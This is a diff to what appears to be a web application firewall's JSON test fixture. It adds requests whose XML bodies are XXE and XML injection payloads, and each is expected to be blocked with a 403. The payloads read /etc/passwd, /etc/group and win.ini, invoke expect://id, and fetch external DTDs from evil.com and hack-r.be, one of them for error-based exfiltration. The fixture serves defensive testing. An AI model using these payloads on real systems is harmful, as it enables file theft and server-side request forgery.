@@ -1,5 +1,41 @@
 [
   {
+    "body": "<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM \"netdoc:/etc/passwd\">]><foo>&data;</foo>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "community-xxe.yml 0/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-7\"?>\n+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4\n+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+\n+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4\n",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "community-xxe.yml 1/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
     "headers": {
       ":authority": "localhost:30081",
       ":method": "GET",
@@ -20696,6 +20732,240 @@
       "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
     },
     "name": "ss-include.yml 4/URL/HTMLMultipartForm",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!DOCTYPE x SYSTEM \"//x/x\" > <x>a</x>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 0/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!DOCTYPE x [ <!ENTITY % y SYSTEM \"//y/y\" > %y; ]><x>a</x>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 1/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://host/text.txt\" > ] > <foo>&xxe;</foo>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 2/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 3/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY> <!ENTITY xxe SYSTEM \"file:///dev/random\">] > <foo>&xxe;</foo>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 4/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" ?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 5/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\" ?><xs:schema xmlns:xs=\"http://www.w3.org/2001/XMLSchema\"><xs:include namespace=\"http://xxe-xsinclude-namespace.yourdomain[.]com/\"/></xs:schema>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 6/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\" ?><x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xxe-xsi-schemalocation.yourdomain[.]com/\"/>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 7/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE x [<!ENTITY % xxe PUBLIC \"any_text\" \"http://evil.com/evil.dtd\">%xxe;]><root>&xxe;</root>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 8/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\" ?><!DOCTYPE message [ <!ENTITY % local_dtd SYSTEM \"jar:file:/opt/jboss/wildfly/modules/system/layers/base/org/apache/lucene/main/lucene-queryparser-5.5.5.jar!/org/apache/lucene/queryparser/xml/LuceneCoreQuery.dtd\"> <!ENTITY % queries 'aaa)> <!ENTITY &#x25; file SYSTEM \"http://evil.com\"> <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>\"> &#x25;eval; &#x25;error; <!ELEMENT aa (bb'> %local_dtd;]><message></message>",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 9/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<?xml version=\"1.0\" encoding=\"ISO-8859-1\" ?>\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n<foo>&xxe;</foo>\n",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 10/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!DOCTYPE xxe [\n<!ELEMENT name ANY >\n<!ENTITY xxe SYSTEM \"file:///etc/group\">]>\n<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">\n<Request>\n<EMailAddress>aaaaa</EMailAddress>\n<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>\n</Request>\n</Autodiscover>\n",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 11/Plain/XMLBody",
+    "response": {
+      "action": "custom_response",
+      "block_mode": false,
+      "status": 403
+    },
+    "verbose": false
+  },
+  {
+    "body": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<userInfo>\n<firstName>John</firstName>\n<lastName>&ent;</lastName>\n</userInfo>\n",
+    "headers": {
+      ":authority": "localhost:30081",
+      ":method": "GET",
+      ":path": "/test",
+      "content-type": "text/xml",
+      "x-forwarded-for": "23.129.64.253",
+      "x-request-id": "e6acdce3-e076-4f0d-9a22-9d82fe01ba60"
+    },
+    "name": "xml-injection.yml 12/Plain/XMLBody",
     "response": {
       "action": "custom_response",
       "block_mode": false,
